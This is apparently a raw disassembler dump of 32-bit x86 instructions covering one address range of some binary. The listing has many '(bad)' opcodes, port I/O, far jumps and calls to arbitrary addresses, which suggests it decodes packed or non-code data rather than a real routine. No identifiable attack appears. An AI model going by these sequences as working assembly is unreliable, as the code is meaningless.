  424c9f:	in     al,0xf0
  424ca1:	add    al,0x89
  424ca3:	adc    DWORD PTR [ebp+ecx*2+0x73],edi
  424ca7:	xchg   edi,eax
  424ca8:	popf   
  424ca9:	test   DWORD PTR [eax],edi
  424cab:	jmp    0x424cb0
	...
  424cc4:	add    BYTE PTR [ebx+0x26fc69b6],ch
  424cca:	repz pop es
  424ccc:	add    DWORD PTR [edi],ebp
  424cce:	add    edi,edi
  424cd0:	call   0xc5b5f351
  424cd5:	lea    eax,[ebp+0x3083e937]
  424cdb:	xchg   DWORD PTR [edi-0x46ba81ed],edx
  424ce1:	retf   0xfd2b
  424ce4:	pop    esp
  424ce5:	pusha  
  424ce6:	pop    esi
  424ce7:	pop    edx
  424ce8:	in     al,0xf6
  424cea:	add    al,0x87
  424cec:	das    
  424ced:	call   0xf8339230
  424cf2:	pop    ebx
  424cf3:	mov    edx,0x44565369
  424cf8:	out    dx,al
  424cf9:	jb     0x424d16
  424cfb:	std    
  424cfc:	mov    dh,0xa5
  424cfe:	test   BYTE PTR [edx-0x53],bh
  424d01:	icebp  
  424d02:	test   DWORD PTR [edx-0x3975b36],0xe2ea7
  424d0c:	add    BYTE PTR [edi],0x69
  424d0f:	cld    
  424d10:	mov    fs,WORD PTR [eax]
  424d12:	pop    esi
  424d13:	stos   DWORD PTR es:[edi],eax
  424d14:	add    BYTE PTR [edx+0x65530000],ch
  424d1a:	fwait
  424d1b:	stos   DWORD PTR es:[edi],eax
  424d1c:	add    ch,bl
  424d1e:	leave  
  424d1f:	shl    bl,1
  424d21:	pop    ebx
  424d22:	hlt    
  424d23:	test   DWORD PTR [esi-0x73],eax
  424d26:	mov    cl,0xfd
  424d28:	pop    edx
	...
  424d41:	add    BYTE PTR [edi+edi*4],ah
  424d44:	or     BYTE PTR [eax],al
  424d46:	nop
  424d47:	call   0xd973d134
  424d4c:	jg     0x424d3a
  424d4e:	mov    ecx,0x5e1441e8
  424d53:	dec    ebx
  424d54:	push   ebx
  424d55:	jmp    FWORD PTR [ebp-0x25efbe18]
  424d5b:	xor    BYTE PTR [edi+0x71f4a945],al
  424d61:	or     BYTE PTR [esi],cl
  424d63:	sub    ah,bh
  424d65:	mov    esp,esp
  424d67:	in     eax,0x70
  424d69:	and    al,0x69
  424d6b:	jmp    0xfe68:0xc9ad2458
  424d72:	jp     0x424d68
  424d74:	add    al,0x5a
  424d77:	jge    0x424d93
  424d79:	add    bl,BYTE PTR [ebp+0x1]
  424d7c:	xchg   DWORD PTR [ebp+0x65],eax
  424d7f:	leave  
  424d80:	pop    esi
  424d81:	cmc    
  424d82:	cmp    dh,ah
  424d84:	test   BYTE PTR [ecx+eax*1+0x4],al
  424d88:	xchg   esi,eax
  424d8a:	or     eax,0x3a81c0c9
  424d8f:	hlt    
  424d90:	test   DWORD PTR [ecx+esi*8-0x8],eax
  424d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d95:	add    ecx,esi
  424d97:	or     eax,0x12a7868
  424d9c:	add    bh,bh
  424d9e:	and    BYTE PTR ds:0x800d4012,ch
  424da4:	pusha  
  424da5:	and    al,0x0
	...
  424dbf:	hlt    
  424dc0:	addr16 add bh,ah
  424dc3:	sbb    DWORD PTR [eax+eax*1+0x0],ebx
  424dc7:	dec    esp
  424dc8:	pop    ecx
  424dc9:	inc    DWORD PTR [ebx+0x5c76]
  424dcf:	ja     0x424de3
  424dd1:	sub    BYTE PTR [eax],dl
  424dd3:	hlt    
  424dd4:	sahf   
  424dd5:	jbe    0x424e1c
  424dd7:	mov    edx,0xf50e24b2
  424ddc:	and    al,0xf8
  424dde:	and    edx,DWORD PTR [eax+0x41]
  424de1:	mov    edx,0xec0a3888
  424de6:	cmp    BYTE PTR ds:0x34740072,0xf1
  424ded:	les    esp,FWORD PTR [ebx]
  424def:	xor    al,0xe9
  424df1:	in     al,dx
  424df2:	and    edx,eax
  424df4:	lds    ecx,FWORD PTR [edi+ecx*4]
  424df7:	mov    ds:0x20bf852b,eax
  424dfc:	cmp    al,0x7d
  424dfe:	inc    ebx
  424dff:	fdivr  DWORD PTR ds:0x28a5e7d0
  424e05:	outs   dx,DWORD PTR ds:[esi]
  424e06:	cld    
  424e07:	and    edx,0x24
  424e0a:	sub    BYTE PTR [ebx+ecx*1+0x5b73ff9f],cl
  424e11:	cmc    
  424e12:	and    esp,DWORD PTR [ebx+esi*2]
  424e15:	adc    al,BYTE PTR [edi+eax*1]
  424e18:	cs add al,0x89
  424e1b:	mov    al,0x9
  424e1d:	and    BYTE PTR [edi-0x7cebee48],al
	...
  424e3b:	add    BYTE PTR [edx+edi*4],dh
  424e3e:	inc    BYTE PTR [esi-0x16e7ee38]
  424e44:	shr    ch,1
  424e46:	out    dx,eax
  424e47:	and    eax,DWORD PTR [ebx]
  424e49:	outs   dx,BYTE PTR ds:[esi]
  424e4a:	test   DWORD PTR [edx+esi*1],0xf40e282a
  424e51:	add    al,0x92
  424e53:	(bad)  
  424e54:	lea    esp,ds:0x2cd7f06c
  424e5a:	das    
  424e5b:	pop    esp
  424e5c:	xor    bl,BYTE PTR [ecx]
  424e5e:	out    0x3,eax
  424e60:	ins    DWORD PTR es:[edi],dx
  424e61:	sbb    bh,BYTE PTR [ebx]
  424e63:	sbb    DWORD PTR [esp+eax*1+0x4f4040f],esi
  424e6a:	inc    edi
  424e6b:	sar    DWORD PTR [ebx+ecx*2+0x16],cl
  424e6f:	outs   dx,DWORD PTR ds:[esi]
  424e70:	or     ax,0x5666
  424e74:	dec    ebp
  424e75:	sub    DWORD PTR [eax+esi*8+0x17],ebp
  424e79:	and    eax,0x18925baf
  424e7e:	out    0x3,eax
  424e80:	jge    0x424e86
  424e82:	out    0x3,eax
  424e84:	je     0x424e3d
  424e86:	shr    BYTE PTR [esi+0x7c],1
  424e89:	dec    ebx
  424e8a:	xchg   esi,eax
  424e8b:	outs   dx,BYTE PTR ds:[esi]
  424e8c:	es or  eax,0x2b0d562e
  424e92:	je     0x424e84
  424e94:	xlat   BYTE PTR ds:[ebx]
  424e95:	sub    al,0xbf
  424e97:	pop    ebx
  424e98:	jle    0x424eb2
  424e9a:	out    0x3,eax
  424e9c:	and    eax,0x7b0def
	...
  424eb9:	mov    eax,0xf3f905b4
  424ebe:	arpl   WORD PTR [ebx+eax*4],dx
  424ec1:	cmp    al,0x63
  424ec3:	xor    eax,0xe6c73fc0
  424ec8:	(bad)  
  424ec9:	pusha  
  424eca:	stc    
  424ecb:	(bad)  
  424ecc:	adc    DWORD PTR [esp+eax*1+0x1317ef67],esi
  424ed3:	out    0xfe,eax
  424ed5:	ja     0x424e5c
  424ed7:	out    0x3,al
  424ed9:	hlt    
  424eda:	(bad)  
  424edb:	cmp    edi,esp
  424edd:	push   ebx
  424ede:	std    
  424edf:	mov    bh,0x6e
  424ee1:	xor    BYTE PTR [edi],bl
  424ee3:	add    BYTE PTR [edx-0x3ea9f2d4],ch
  424ee9:	fdiv   QWORD PTR [ebx-0x4]
  424eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424eed:	into   
  424eee:	inc    ebp
  424eef:	jae    0x424f03
  424ef1:	(bad)  
  424ef2:	jae    0x424e92
  424ef4:	or     eax,0x1ffc4b4
  424ef9:	mov    ch,BYTE PTR [ebx]
  424efb:	std    
  424efc:	std    
  424efd:	(bad)  
  424efe:	hlt    
  424eff:	mov    BYTE PTR ds:0x46e7f928,ah
  424f05:	je     0x424f68
  424f07:	cld    
  424f08:	dec    eax
  424f09:	fisttp DWORD PTR [esi+0x40]
  424f0c:	jmp    0x148255b
  424f11:	xor    bh,dh
  424f13:	lods   eax,DWORD PTR ds:[esi]
  424f14:	jmp    0x1da5d110
  424f19:	mov    dh,0x62
  424f1b:	or     ebp,0x0
	...
  424f35:	add    cl,dh
  424f37:	cld    
  424f38:	inc    DWORD PTR [edi-0x16bfb165]
  424f3e:	jbe    0x424f26
  424f40:	add    eax,0x6381f809
  424f45:	xor    eax,0xbd8762b6
  424f4a:	stc    
  424f4b:	add    BYTE PTR [edi-0x3b3473],bl
  424f51:	popa   
  424f52:	inc    ebx
  424f53:	es js  0x424fc6
  424f56:	cmp    ecx,DWORD PTR [eax]
  424f58:	adc    BYTE PTR [eax+0x5b],cl
  424f5b:	dec    esi
  424f5c:	inc    eax
  424f5d:	jmp    0x6d661d50
  424f62:	loopne 0x424f31
  424f64:	add    eax,0xcbe696fd
  424f69:	sub    bh,al
  424f6b:	mov    ecx,DWORD PTR [ebx+0xd]
  424f6e:	loopne 0x424ef9
  424f70:	dec    ebx
  424f71:	out    0x1b,eax
  424f73:	ins    BYTE PTR es:[edi],dx
  424f74:	pop    ds
  424f75:	add    BYTE PTR [edx],dh
  424f77:	pop    ebp
  424f78:	and    BYTE PTR [eax-0x5a],bh
  424f7b:	mov    WORD PTR [eax],fs
  424f7d:	sbb    BYTE PTR ds:0xd6e80006,0xe1
  424f84:	sti    
  424f85:	dec    DWORD PTR [esi+0x1d102054]
  424f8b:	pop    edx
  424f8c:	add    eax,0x102ce9ff
  424f91:	call   0x3f5c4a
  424f96:	(bad)  
  424f98:	adc    DWORD PTR [eax+eax*1],ebx
	...
  424fb3:	iret   
  424fb4:	inc    ebp
  424fb5:	cld    
  424fb6:	jmp    0x90e:0xcc48b0d8
  424fbd:	test   BYTE PTR [ecx+ebp*8+0x10],0x4
  424fc2:	je     0x424f4e
  424fc4:	fadd   QWORD PTR [eax+0x24]
  424fc7:	mov    ecx,0x541049dc
  424fcc:	push   es
  424fcd:	xchg   DWORD PTR [ecx+ebp*8+0x40],eax
  424fd1:	xchg   DWORD PTR [ebp-0x37],ecx
  424fd4:	cmp    BYTE PTR [ebp+0x17f9e201],al
  424fda:	adc    cl,BYTE PTR [ebp+0x5]
  424fdd:	xchg   DWORD PTR [ebp-0x5b],esi
  424fe0:	mov    ebp,0xeff2f046
  424fe5:	aaa    
  424fe6:	ret    
  424fe7:	push   0x7be8525b
  424fec:	aad    0xfb
  424fee:	push   DWORD PTR [esi-0x19de8f3c]
  424ff4:	fcomp  DWORD PTR [ebp-0x3bbee9c]
  424ffa:	push   0x6b
  424ffc:	std    
  424ffd:	cli    
  424ffe:	je     0x42504b
  425000:	popa   
  425001:	in     al,0x58
  425003:	add    BYTE PTR ds:0x2ff48b00,0x28
  42500a:	outs   dx,DWORD PTR fs:[esi]
  42500c:	inc    eax
  42500d:	in     al,0xcb
  42500f:	mov    bh,0x6b
  425011:	jns    0x425056
  425013:	add    dh,BYTE PTR [eax-0x2d]
  425016:	cld    
	...
  42502f:	add    BYTE PTR [ecx],al
  425031:	cmp    BYTE PTR [esi],cl
  425033:	inc    eax
  425034:	hlt    
  425035:	rol    ah,0x23
  425038:	mov    ah,0x73
  42503a:	in     al,0x8b
  42503c:	adc    eax,DWORD PTR [edx+0x5fd04377]
  425042:	retf   
  425043:	pop    ebp
  425044:	lahf   
  425045:	out    0x65,al
  425047:	pop    edx
  425048:	cmp    eax,DWORD PTR ss:[eax]
  42504b:	push   ebx
  42504c:	jg     0x424fe0
  42504e:	pop    eax
  42504f:	push   edx
  425050:	add    ebp,DWORD PTR [ebp+0x0]
  425053:	test   BYTE PTR [edx+ebx*2-0x3fd8aa40],dh
  42505a:	sub    DWORD PTR [ebx-0x1c],esi
  42505d:	cmp    DWORD PTR [ebx],ecx
  42505f:	aaa    
  425060:	inc    ecx
  425061:	push   0xfffffff4
  425063:	sbb    DWORD PTR [esi+ebp*2+0x0],ecx
  425067:	add    BYTE PTR [edi+eax*8-0x664cf00b],dl
  42506e:	cld    
  42506f:	cld    
  425070:	and    DWORD PTR [esi+0x6b],esp
  425073:	adc    ah,BYTE PTR [eax]
  425075:	cmp    eax,eax
  425077:	jmp    FWORD PTR [ecx+eax*4+0x10]
  42507b:	xchg   DWORD PTR [ecx],ecx
  42507d:	jb     0x4250fc
  42507f:	inc    edx
  425080:	in     al,dx
  425081:	popf   
  425082:	jge    0x4250c6
  425084:	call   0x23f2326
  425089:	push   esi
  42508a:	das    
  42508b:	(bad)  
  42508c:	pop    esp
  42508d:	jle    0x4250fc
  42508f:	cld    
  425090:	imul   edi,DWORD PTR [eax+0x7f],0xfffffff7
	...
  4250ac:	add    BYTE PTR [ebx-0x27],ah
  4250af:	add    ebx,DWORD PTR [ebx+0x5b]
  4250b2:	add    eax,0xc4e67c0c
  4250b7:	out    0xc8,al
  4250b9:	xor    eax,0x6cd0e6f9
  4250be:	jno    0x42507e
  4250c0:	push   0xffffffe1
  4250c2:	add    eax,0xd9737fe7
  4250c7:	es shl ah,cl
  4250ca:	push   esi
  4250cb:	out    dx,eax
  4250cc:	lock repz fmul st,st(5)
  4250d0:	sub    al,0xa7
  4250d2:	adc    BYTE PTR [ebx],bl
  4250d4:	push   cs
  4250d5:	pushf  
  4250d6:	add    al,0xe7
  4250d8:	add    edx,DWORD PTR [eax+eiz*2+0x1b]
  4250dc:	adc    al,0x1
  4250de:	fcmovu st,st(2)
  4250e0:	push   0xffffff86
  4250e2:	or     al,0x86
  4250e4:	adc    DWORD PTR [eax+0x730426f9],ebp
  4250ea:	(bad)  
  4250ec:	jl     0x425154
  4250ee:	adc    DWORD PTR [ecx+eax*8+0x3],ebx
  4250f2:	mov    ch,0x73
  4250f4:	shl    edi,0xb4
  4250f7:	mov    ah,0x6a
  4250f9:	inc    esi
  4250fa:	or     eax,0x5ddb3d1a
  4250ff:	dec    edx
  425100:	imul   edi,DWORD PTR [eax-0x4f939642],0xffffffd9
  425107:	in     eax,0xc8
  425109:	test   al,0x29
  42510b:	ja     0x42511e
  42510d:	xor    al,0x5
  42510f:	mov    WORD PTR [ebp+0x0],es
	...
  42512a:	pop    es
  42512b:	add    eax,0x839f7ebc
  425130:	add    ch,BYTE PTR [esp+esi*2+0x70]
  425134:	ret    0x9bd1
  425137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425138:	hlt    
  425139:	add    al,0xf4
  42513b:	mov    BYTE PTR [esi],ah
  42513d:	lock out 0x13,al
  425140:	cmc    
  425141:	fst    QWORD PTR [ebx]
  425143:	xchg   edx,eax
  425144:	jmp    FWORD PTR [ebx+eax*1+0x63743711]
  42514b:	rcl    BYTE PTR [edx],cl
  42514d:	aas    
  42514e:	sub    BYTE PTR [eax+0x12],ah
  425151:	cmp    esi,esp
  425153:	(bad)  
  425154:	jmp    FWORD PTR [ecx+0x3]
  425157:	or     al,0xc5
  425159:	and    eax,0xe9280d14
  42515e:	test   DWORD PTR [ecx+ebp*8],0xbd29efa
  425165:	sbb    eax,eax
  425167:	fisubr DWORD PTR [ebx+0x7417f7e9]
  42516d:	int    0x3
  42516f:	fldenv [ebx]
  425171:	loopne 0x42518e
  425173:	and    edx,DWORD PTR [eax]
  425175:	sbb    eax,0xe8ffecee
  42517a:	mul    DWORD PTR [esp+edi*8-0x302ec03]
  425181:	cmc    
  425182:	or     edi,ebp
  425184:	cld    
  425185:	cld    
  425186:	fbld   TBYTE PTR [ecx+0x12]
  425189:	in     eax,dx
  42518a:	add    al,0xc5
  42518c:	jmp    FWORD PTR [edi+0x0]
	...
  4251a7:	jecxz  0x4251cb
  4251a9:	adc    BYTE PTR [eax-0x25],dh
  4251ac:	and    dl,BYTE PTR [esp+eiz*2]
  4251af:	and    DWORD PTR [edx],0x20
  4251b2:	mov    ecx,0x923c23c
  4251b7:	enter  0xfcb8,0xb4
  4251bb:	scas   eax,DWORD PTR es:[edi]
  4251bc:	adc    eax,0x5ac241c7
  4251c1:	cld    
  4251c2:	cs jb  0x42521b
  4251c5:	cld    
  4251c6:	pushf  
  4251c7:	sti    
  4251c8:	mov    DWORD PTR [ebx-0x3b],eax
  4251cb:	(bad)  
  4251cc:	ins    DWORD PTR es:[edi],dx
  4251cd:	add    BYTE PTR [edx-0x4c],ah
  4251d0:	or     bh,ch
  4251d2:	xchg   esp,eax
  4251d3:	out    dx,eax
  4251d4:	pop    edi
  4251d5:	jb     0x4251d7
  4251d7:	push   ecx
  4251d8:	jmp    0x42524b
  4251da:	adc    BYTE PTR [ebp+0x6a0871eb],cl
  4251e0:	push   cs
  4251e1:	mov    al,ds:0x5e028d15
  4251e6:	mov    eax,DWORD PTR [eax+0x46]
  4251e9:	mov    esi,0x874f5d14
  4251ee:	in     al,dx
  4251ef:	into   
  4251f0:	in     al,0xf4
  4251f2:	cmp    DWORD PTR [ecx-0x3],0x55
  4251f6:	call   0x3f6031
  4251fb:	xchg   ecx,eax
  4251fc:	enter  0x7570,0x1e
  425200:	aam    0x66
  425202:	sub    BYTE PTR [eax+0x140c2044],bh
  425208:	outs   dx,DWORD PTR ds:[esi]
  425209:	or     BYTE PTR [ebp+0x0],dh
	...
  425224:	add    BYTE PTR [esp+ecx*2],dh
  425227:	inc    DWORD PTR [eax]
  425229:	xor    dl,BYTE PTR [edx]
  42522b:	inc    eax
  42522c:	or     eax,0xa20cc089
  425231:	inc    esp
  425232:	and    BYTE PTR [eax],cl
  425234:	lds    eax,FWORD PTR [ecx]
  425236:	add    BYTE PTR [eax],al
  425238:	jbe    0x425251
  42523a:	sti    
  42523b:	jne    0x4251f6
  42523d:	xor    esp,esp
  42523f:	fsub   DWORD PTR [esi+0x8]
  425242:	add    BYTE PTR [ecx],bh
  425244:	mov    eax,ds:0xf17413fd
  425249:	sub    DWORD PTR [esp-0x43],esi
  42524d:	ins    DWORD PTR es:[edi],dx
  42524e:	sbb    ch,BYTE PTR [eax-0x63]
  425251:	add    DWORD PTR [eax],eax
  425253:	mov    al,ds:0x182054ea
  425258:	jmp    0x46d:0xca182054
  42525f:	call   DWORD PTR [eax-0x62bfee53]
  425265:	fidiv  DWORD PTR [eax+0x24]
  425268:	hlt    
  425269:	pop    ebx
  42526a:	jns    0x4252df
  42526c:	rcl    BYTE PTR [edi+0x75],1
  42526f:	inc    ebx
  425270:	sbb    BYTE PTR [eax+edx*8-0x76],cl
  425274:	mov    al,0x47
  425276:	and    BYTE PTR [eax-0x36],dl
  425279:	push   esi
  42527a:	in     eax,dx
  42527b:	pop    es
  42527c:	daa    
  42527d:	and    eax,0x664fc55c
  425282:	or     BYTE PTR [si+0x3e],0xed
  425287:	sbb    eax,DWORD PTR [eax]
	...
  4252a1:	jno    0x4252d2
  4252a3:	and    BYTE PTR [eax],cl
  4252a5:	dec    edi
  4252a6:	push   0x7b
  4252a8:	inc    edx
  4252a9:	add    BYTE PTR [edi-0x13],al
  4252ac:	pop    ss
  4252ad:	sub    ebx,DWORD PTR [eax]
  4252af:	adc    ch,bh
  4252b1:	test   eax,0xa1fcd03b
  4252b6:	arpl   WORD PTR [edi+0x12],sp
  4252b9:	pop    eax
  4252ba:	pusha  
  4252bb:	sar    bh,0xa9
  4252be:	rcr    BYTE PTR [ebp+0x5a],cl
  4252c1:	ss pop edi
  4252c3:	add    BYTE PTR [ecx-0x5e],dl
  4252c6:	loop   0x4252b4
  4252c8:	and    eax,DWORD PTR [eax]
  4252ca:	cld    
  4252cb:	data16 adc bl,BYTE PTR [ecx+esi*1+0x766effc0]
  4252d3:	pop    eax
  4252d4:	dec    esi
  4252d5:	add    DWORD PTR [ebp+0x0],ebp
  4252d8:	test   BYTE PTR [edx+edi*1-0x5574aae4],dh
  4252df:	xor    al,0x40
  4252e1:	hlt    
  4252e2:	call   0xffc0:0x5fdc1267
  4252e9:	fwait
  4252ea:	and    dl,BYTE PTR [esi-0x4]
  4252ed:	stos   DWORD PTR es:[edi],eax
  4252ee:	out    dx,eax
  4252ef:	push   0x586928fc
  4252f4:	xchg   edi,eax
  4252f5:	mov    ch,BYTE PTR [ebx]
  4252f7:	push   0xfc059354
  4252fc:	pop    es
  4252fd:	out    0xc4,al
  4252ff:	out    0xc8,al
  425301:	and    DWORD PTR [eax+0xcc29],edx
	...
  42531b:	add    BYTE PTR [eax],al
  42531d:	add    BYTE PTR [ebp+0x7ccee701],dh
  425323:	imul   ecx,DWORD PTR [esi],0xe706070d
  425329:	jg     0x4252ce
  42532b:	sar    DWORD PTR [edi-0x5be1cbcc],1
  425331:	test   edi,0xfbc12026
  425337:	sar    bl,cl
  425339:	sub    al,0xb7
  42533b:	lock pop edx
  42533d:	or     al,0xa4
  42533f:	mov    ah,0xcd
  425341:	icebp  
  425342:	pop    es
  425343:	mov    ch,BYTE PTR [ebx]
  425345:	cld    
  425346:	sub    dl,dl
  425348:	(bad)  
  425349:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42534b:	or     BYTE PTR [edi-0x52a3df43],bh
  425351:	or     DWORD PTR [ebx],0x5c
  425354:	sbb    edi,edi
  425356:	scas   al,BYTE PTR es:[edi]
  425357:	pop    ebx
  425358:	ret    
  425359:	xchg   ebx,eax
  42535a:	out    0xc4,al
  42535c:	out    0xc8,al
  42535e:	xor    eax,0x7cd0e6f5
  425363:	push   0xf0c25c1c
  425368:	out    0x3,eax
  42536a:	ins    DWORD PTR es:[edi],dx
  42536b:	shl    edx,1
  42536d:	jg     0x42530a
  42536f:	sar    BYTE PTR [edi+0xbd0c980],1
  425375:	jnp    0x425398
  425377:	icebp  
  425378:	arpl   WORD PTR [edx+0x47],dx
  42537b:	sti    
  42537c:	arpl   WORD PTR [esi-0x7f21701d],di
	...
  42539a:	add    BYTE PTR [edx+0x2666dbd0],bh
  4253a0:	icebp  
  4253a1:	rol    BYTE PTR [esp+eax*2],1
  4253a4:	mov    dh,0xff
  4253a6:	call   0x51f5:0x4107c71c
  4253ad:	cld    
  4253ae:	es ja  0x425404
  4253b1:	cld    
  4253b2:	xchg   esp,eax
  4253b3:	out    0x59,eax
  4253b5:	jb     0x4253b4
  4253b7:	adc    dl,bh
  4253b9:	movzx  ebx,dx
  4253bc:	(bad)  
  4253bd:	pop    es
  4253be:	push   es
  4253bf:	add    eax,0xf7a91271
  4253c4:	mov    edx,0x5002b5a
  4253c9:	push   ebx
  4253ca:	bound  ebp,QWORD PTR [ebx+eiz*2+0x4f0fd8b]
  4253d1:	test   BYTE PTR [ecx+0x5cfcf253],ch
  4253d7:	in     al,0x8f
  4253d9:	inc    edx
  4253da:	loope  0x425429
  4253dc:	add    eax,0xed2c3cfd
  4253e1:	call   DWORD PTR [edx-0x8]
  4253e4:	ins    BYTE PTR es:[edi],dx
  4253e5:	enter  0x92bf,0x58
  4253e9:	xor    BYTE PTR [ecx+0x4404d69a],0x93
  4253f0:	es cwde 
  4253f2:	hlt    
  4253f3:	aaa    
  4253f4:	pop    ebx
  4253f5:	pop    ebx
  4253f6:	stos   DWORD PTR es:[edi],eax
  4253f7:	out    0x4,eax
  4253f9:	push   ebx
  4253fa:	bound  ecx,QWORD PTR [ebx+0x62]
  4253fd:	pop    ebx
  4253fe:	fld    QWORD PTR [eax]
	...
  425418:	lock add al,0x84
  42541b:	test   eax,0x1e55c4d3
  425420:	xchg   ebx,eax
  425421:	into   
  425422:	retf   
  425423:	sub    bh,al
  425425:	scas   eax,DWORD PTR es:[edi]
  425426:	cld    
  425427:	cld    
  425428:	push   esi
  42542a:	aas    
  42542b:	jmp    0x414a2b6e
  425430:	push   esi
  425431:	outs   dx,BYTE PTR ds:[esi]
  425432:	cld    
  425433:	dec    esi
  425434:	jbe    0x425488
  425436:	cld    
  425437:	add    BYTE PTR [ecx+0x0],ch
  42543a:	rol    BYTE PTR [di],0x6
  42543e:	add    DWORD PTR [ecx+edx*8+0x46],esp
  425442:	cld    
  425443:	add    BYTE PTR [ebp+0xa],0xfd
  425447:	je     0x4253cb
  425449:	fild   WORD PTR [eax+edx*1+0xe]
  42544d:	imul   eax,DWORD PTR [eax],0x87585900
  425453:	inc    eax
  425454:	cmp    ecx,ebx
  425456:	inc    ecx
  425457:	or     BYTE PTR [edx+0x3f1c11e3],cl
  42545d:	inc    esi
  42545e:	cld    
  42545f:	pop    esi
  425460:	or     DWORD PTR [ebp-0x5],0x25
  425464:	sbb    eax,0x25003ff5
  425469:	pop    edi
  42546a:	adc    BYTE PTR [ecx],al
  42546c:	dec    ebp
  42546d:	fidivr DWORD PTR [esp+esi*2+0x2448dd54]
  425474:	adc    eax,0x32eeb0be
  425479:	loopne 0x425476
  42547b:	and    eax,0x0
	...
  425494:	add    BYTE PTR [ebp+0x35004009],cl
  42549a:	xlat   BYTE PTR ds:[ebx]
  42549b:	lidtd  ds:0x474bcda
  4254a2:	fisttp QWORD PTR [eax+0x24]
  4254a5:	add    eax,0x62ee98be
  4254aa:	loopne 0x4254a7
  4254ac:	and    eax,0x400a61
  4254b1:	or     ah,bl
  4254b3:	call   0xfd94353b
  4254b8:	je     0x425474
  4254ba:	test   BYTE PTR [ecx+0x14],bh
  4254bd:	fldcw  WORD PTR [edx+0xd]
  4254c0:	call   0x3f48cb
  4254c5:	pop    ecx
  4254c6:	shl    DWORD PTR [eax+0x8],0xf4
  4254ca:	out    0xb4,al
  4254cc:	setl   BYTE PTR [ecx]
  4254cf:	push   edx
  4254d0:	cld    
  4254d1:	stos   DWORD PTR es:[edi],eax
  4254d2:	mov    al,ds:0x30702263
  4254d7:	sar    bh,0x41
  4254da:	arpl   WORD PTR [edx-0x349c278d],bp
  4254e0:	mov    cl,BYTE PTR [eax-0x42]
  4254e3:	sti    
  4254e4:	inc    BYTE PTR [ebx+0x710c776b]
  4254ea:	and    al,0xf0
  4254ec:	add    eax,0xfed66c7f
  4254f1:	push   0x3b
  4254f3:	jg     0x425519
  4254f5:	hlt    
  4254f6:	sahf   
  4254f7:	inc    eax
  4254f8:	pop    esp
	...
  425511:	add    dl,dl
  425513:	in     al,0x7f
  425515:	jo     0x425503
  425517:	ins    BYTE PTR es:[edi],dx
  425518:	add    BYTE PTR [eax],al
  42551a:	stos   BYTE PTR es:[edi],al
  42551b:	lods   eax,DWORD PTR ds:[esi]
  42551c:	cld    
  42551d:	jmp    FWORD PTR [eax+0x487e54d6]
  425523:	xor    eax,DWORD PTR [eax]
  425525:	add    ah,dh
  425527:	push   ds
  425528:	into   
  425529:	push   esp
  42552a:	jns    0x425554
  42552c:	pushf  
  42552d:	dec    edi
  42552e:	cmp    ah,BYTE PTR [eax]
  425530:	call   DWORD PTR [bp+di]
  425533:	push   es
  425534:	inc    ebp
  425535:	std    
  425536:	adc    edi,DWORD PTR [eax+0x501ccbed]
  42553c:	dec    esp
  42553d:	inc    DWORD PTR [ebx]
  42553f:	out    dx,al
  425540:	fst    st(3)
  425542:	hlt    
  425543:	out    0x42,al
  425545:	les    edi,FWORD PTR [ecx]
  425547:	jp     0x425515
  425549:	je     0x42557f
  42554b:	outs   dx,BYTE PTR ds:[esi]
  42554c:	pop    eax
  42554d:	fs stos DWORD PTR es:[edi],eax
  42554f:	xlat   BYTE PTR ds:[ebx]
  425550:	arpl   WORD PTR [eax-0x7f8a99c7],cx
  425556:	in     al,dx
  425557:	ins    BYTE PTR es:[edi],dx
  425558:	add    BYTE PTR [eax],al
  42555a:	jge    0x425561
  42555c:	lods   al,BYTE PTR ds:[esi]
  42555d:	arpl   WORD PTR [esi-0x7c],bp
  425560:	out    dx,al
  425561:	add    dh,ah
  425563:	add    al,0x2d
  425565:	mov    esi,0xbe26059f
  42556a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42556b:	sahf   
  42556c:	rol    ebx,1
  42556e:	mov    ds:0x723fa38d,eax
  425573:	ret    0x783e
	...
  42558e:	add    BYTE PTR [esi],dh
  425590:	ins    DWORD PTR es:[edi],dx
  425591:	popa   
  425592:	xor    edi,DWORD PTR [ebp-0x3e]
  425595:	sbb    bh,BYTE PTR [eax+0xb]
  425598:	add    al,0x6c
  42559a:	out    0xbe,eax
  42559c:	lods   al,BYTE PTR ds:[esi]
  42559d:	pop    edi
  42559e:	out    0x63,al
  4255a0:	adc    BYTE PTR [edi+ebp*8],0xb4
  4255a4:	mov    DWORD PTR [ebx-0x5c764ca1],ebp
  4255aa:	cmp    ebp,DWORD PTR [ebx-0xbec2114]
  4255b0:	add    al,0x7f
  4255b2:	fs dec eax
  4255b4:	add    eax,0xc962e7
  4255b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255ba:	leave  
  4255bb:	push   edi
  4255bc:	add    edi,esp
  4255be:	add    esi,esp
  4255c0:	push   edi
  4255c1:	repz repz add ebp,eax
  4255c5:	out    0x88,al
  4255c7:	arpl   dx,dx
  4255c9:	rcl    DWORD PTR [eax+0x63164cb6],cl
  4255cf:	mov    DWORD PTR [esi+ebp*4],ecx
  4255d2:	stc    
  4255d3:	lahf   
  4255d4:	cmc    
  4255d5:	es add al,0x77
  4255d8:	inc    ebp
  4255d9:	in     eax,dx
  4255da:	mov    BYTE PTR [esi],dl
  4255dc:	push   es
  4255dd:	out    0x3,eax
  4255df:	icebp  
  4255e0:	sar    DWORD PTR [edx+0x6c],1
  4255e3:	push   ss
  4255e4:	pop    eax
  4255e5:	test   DWORD PTR [ebx+0x6c],esp
  4255e8:	shl    DWORD PTR [edx+0x13],0xa2
  4255ec:	(bad)  
  4255ed:	push   DWORD PTR [ebp-0x78]
  4255f0:	pop    edi
  4255f1:	fist   WORD PTR [esi]
	...
  42560b:	add    al,dh
  42560d:	add    al,0x84
  42560f:	sub    DWORD PTR [ebp+0x176a65ef],ebx
  425615:	add    eax,0x573a6d0d
  42561a:	cld    
  42561b:	jmp    0x70a79b22
  425620:	out    dx,eax
  425621:	ds inc edx
  425623:	inc    edx
  425624:	icebp  
  425625:	pop    edi
  425626:	mov    bl,0xe8
  425628:	test   DWORD PTR [edx+ebp*2],0xa7bb1fd5
  42562f:	jmp    0x9601da2b
  425634:	jle    0x4255c2
  425636:	dec    edx
  425637:	sbb    eax,0xde0e8f07
  42563c:	lea    edi,[esi-0x73576404]
  425642:	out    dx,eax
  425643:	adc    esp,ecx
  425645:	leave  
  425646:	(bad)  
